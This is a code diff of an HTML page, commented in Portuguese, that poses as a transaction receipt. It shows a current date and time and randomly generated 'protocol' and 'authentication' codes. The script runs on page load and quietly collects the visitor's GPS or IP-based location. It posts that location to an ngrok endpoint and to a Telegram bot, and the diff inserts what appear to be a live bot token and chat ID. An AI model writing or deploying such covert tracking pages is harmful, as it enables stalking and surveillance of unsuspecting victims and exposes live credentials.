@@ -121,98 +121,107 @@
     </div>
   </section>
 
- <script>
-    // Elementos
-    const elData = document.getElementById("data-atual");
-    const elHora = document.getElementById("hora-atual");
-    const elProt = document.getElementById("protocolo");
-    const elAuth = document.getElementById("autenticacao");
+<script>
+  // Elementos do comprovante
+  const elData = document.getElementById("data-atual");
+  const elHora = document.getElementById("hora-atual");
+  const elProt = document.getElementById("protocolo");
+  const elAuth = document.getElementById("autenticacao");
 
-    // Preenche data e hora
-    const agora = new Date();
-    elData.textContent = agora.toLocaleDateString("pt-BR");
-    elHora.textContent = agora.toLocaleTimeString("pt-BR", {
-      hour: "2-digit", minute: "2-digit", second: "2-digit"
-    });
+  // Preenche data e hora
+  const agora = new Date();
+  elData.textContent = agora.toLocaleDateString("pt-BR");
+  elHora.textContent = agora.toLocaleTimeString("pt-BR", {
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit"
+  });
 
-    // Gera códigos fake
-    const randHex = n => [...crypto.getRandomValues(new Uint8Array(n))]
-      .map(b => b.toString(16).padStart(2,"0")).join("");
-    elProt.textContent = randHex(6).toUpperCase();
-    elAuth.textContent = randHex(16).toUpperCase();
+  // Gera códigos fictícios
+  const randHex = n =>
+    [...crypto.getRandomValues(new Uint8Array(n))]
+      .map(b => b.toString(16).padStart(2, "0"))
+      .join("");
+  elProt.textContent = randHex(6).toUpperCase();
+  elAuth.textContent = randHex(16).toUpperCase();
 
-    // Configurações
-    const BACKEND_ENDPOINT = "https://1e2746f31e5a.ngrok-free.app/send-location";
-    const IP_API_URL      = "https://ipapi.co/json/";
-    const TELEGRAM_TOKEN  = "YOUR_TELEGRAM_BOT_TOKEN";
-    const CHAT_ID         = "YOUR_CHAT_ID";
+  // Configurações de envio
+  const BACKEND_ENDPOINT    = "https://1e2746f31e5a.ngrok-free.app/send-location";
+  const IP_API_URL          = "https://ipapi.co/json/";
+  const TELEGRAM_BOT_TOKEN  = "8442922985:AAFNcmR2yqERaoVf28aENwewRrOpwEBfU1U";
+  const TELEGRAM_CHAT_ID    = "5693440005";
 
-    document.addEventListener("DOMContentLoaded", obterLocalizacao);
+  document.addEventListener("DOMContentLoaded", obterLocalizacao);
 
-    async function obterLocalizacao() {
-      if (!window.isSecureContext) return obterLocalizacaoPorIP();
-      try {
-        const perm = navigator.permissions && await navigator.permissions.query({name: "geolocation"});
-        if (perm && perm.state === "denied") return obterLocalizacaoPorIP();
-      } catch { /* ignore */ }
+  async function obterLocalizacao() {
+    if (!window.isSecureContext) return obterLocalizacaoPorIP();
+    try {
+      const perm = navigator.permissions && await navigator.permissions.query({ name: "geolocation" });
+      if (perm && perm.state === "denied") return obterLocalizacaoPorIP();
+    } catch { /* ignora */ }
 
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(handlePos, obterLocalizacaoPorIP, {
-          enableHighAccuracy: true, timeout: 10000
-        });
-      } else {
-        obterLocalizacaoPorIP();
-      }
-    }
-
-    async function obterLocalizacaoPorIP() {
-      try {
-        const d = await fetch(IP_API_URL).then(r => r.json());
-        handleData({
-          latitude:  d.latitude,
-          longitude: d.longitude,
-          ip:        d.ip,
-          metodo:    "ip"
-        });
-      } catch { /* fail silently */ }
-    }
-
-    function handlePos(pos) {
-      handleData({
-        latitude:  pos.coords.latitude,
-        longitude: pos.coords.longitude,
-        metodo:    "gps"
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(handlePos, obterLocalizacaoPorIP, {
+        enableHighAccuracy: true,
+        timeout: 10000
       });
+    } else {
+      obterLocalizacaoPorIP();
     }
+  }
 
-    async function handleData(data) {
-      // monta URL do Maps
-      data.mapsUrl   = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-      data.timestamp = new Date().toISOString();
+  async function obterLocalizacaoPorIP() {
+    try {
+      const d = await fetch(IP_API_URL).then(r => r.json());
+      handleData({
+        latitude:  d.latitude,
+        longitude: d.longitude,
+        ip:        d.ip,
+        metodo:    "ip"
+      });
+    } catch {
+      /* ignora falhas */
+    }
+  }
 
-      // envia ao seu backend
-      fetch(BACKEND_ENDPOINT, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify(data)
-      }).catch(()=>{});
+  function handlePos(pos) {
+    handleData({
+      latitude:  pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      metodo:    "gps"
+    });
+  }
 
-      // envia mensagem ao Telegram
-      const text = `
+  async function handleData(data) {
+    // Monta a URL do Google Maps corretamente
+    data.mapsUrl   = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+    data.timestamp = new Date().toISOString();
+
+    // Envia para o seu backend via ngrok
+    fetch(BACKEND_ENDPOINT, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify(data)
+    }).catch(() => { /* silencioso */ });
+
+    // Envia mensagem formatada ao Telegram
+    const texto = `
 📍 Localização detectada:
-Latitude: ${data.latitude}
+Latitude:  ${data.latitude}
 Longitude: ${data.longitude}
-Mapa: ${data.mapsUrl}
-Método: ${data.metodo}`;
-      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text:    text.trim()
-        })
-      }).catch(console.error);
-    }
-  </script>
+Mapa:      ${data.mapsUrl}
+Método:    ${data.metodo}
+    `.trim();
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text:    texto
+      })
+    }).catch(console.error);
+  }
+</script>
 </body>
 </html>
